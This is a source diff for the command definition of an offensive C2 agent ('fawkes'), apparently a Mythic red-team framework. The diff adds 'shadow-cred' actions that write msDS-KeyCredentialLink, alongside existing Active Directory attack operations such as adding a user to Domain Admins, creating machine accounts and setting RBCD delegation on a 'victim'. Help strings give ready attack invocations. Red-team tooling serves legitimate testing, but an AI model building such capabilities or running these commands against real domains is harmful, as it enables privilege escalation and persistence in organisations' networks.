@@ -10,11 +10,11 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "ldap-write",
-		Description:         "Modify Active Directory objects via LDAP. Add/remove group members, set attributes, manage SPNs, enable/disable accounts, set passwords, create machine accounts, RBCD delegation, delete objects.",
-		HelpString:          "ldap-write -action add-member -server dc01 -target jsmith -group \"Domain Admins\"\nldap-write -action add-computer -server dc01 -target FAKEPC01 -value Password123!\nldap-write -action set-rbcd -server dc01 -target victim -value FAKEPC01$",
+		Description:         "Modify Active Directory objects via LDAP. Add/remove group members, set attributes, manage SPNs, enable/disable accounts, set passwords, create machine accounts, RBCD delegation, shadow credentials, delete objects.",
+		HelpString:          "ldap-write -action add-member -server dc01 -target jsmith -group \"Domain Admins\"\nldap-write -action shadow-cred -server dc01 -target victim -username user@domain -password pass\nldap-write -action set-rbcd -server dc01 -target victim -value FAKEPC01$",
 		Version:             1,
 		Author:              "@galoryber",
-		MitreAttackMappings: []string{"T1098", "T1098.005", "T1134.001", "T1136.002"},
+		MitreAttackMappings: []string{"T1098", "T1098.005", "T1134.001", "T1136.002", "T1556.006"},
 		CommandAttributes: agentstructs.CommandAttribute{
 			SupportedOS: []string{
 				agentstructs.SUPPORTED_OS_WINDOWS,
@@ -27,9 +27,9 @@ func init() {
 				Name:             "action",
 				CLIName:          "action",
 				ModalDisplayName: "Action",
-				Description:      "Operation: add-member, remove-member, set-attr, add-attr, remove-attr, set-spn, disable, enable, set-password, add-computer, delete-object, set-rbcd, clear-rbcd",
+				Description:      "Operation: add-member, remove-member, set-attr, add-attr, remove-attr, set-spn, disable, enable, set-password, add-computer, delete-object, set-rbcd, clear-rbcd, shadow-cred, clear-shadow-cred",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"add-member", "remove-member", "set-attr", "add-attr", "remove-attr", "set-spn", "disable", "enable", "set-password", "add-computer", "delete-object", "set-rbcd", "clear-rbcd"},
+				Choices:          []string{"add-member", "remove-member", "set-attr", "add-attr", "remove-attr", "set-spn", "disable", "enable", "set-password", "add-computer", "delete-object", "set-rbcd", "clear-rbcd", "shadow-cred", "clear-shadow-cred"},
 				DefaultValue:     "add-member",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{ParameterIsRequired: true, GroupName: "Default"},
@@ -190,6 +190,12 @@ func init() {
 			case "clear-rbcd":
 				displayMsg = fmt.Sprintf("LDAP clear-rbcd %s", target)
 				artifactMsg = fmt.Sprintf("LDAP clear RBCD: %s (server: %s)", target, server)
+			case "shadow-cred":
+				displayMsg = fmt.Sprintf("LDAP shadow-cred %s", target)
+				artifactMsg = fmt.Sprintf("LDAP write msDS-KeyCredentialLink: %s (server: %s)", target, server)
+			case "clear-shadow-cred":
+				displayMsg = fmt.Sprintf("LDAP clear-shadow-cred %s", target)
+				artifactMsg = fmt.Sprintf("LDAP clear msDS-KeyCredentialLink: %s (server: %s)", target, server)
 			}
 
 			response.DisplayParams = &displayMsg
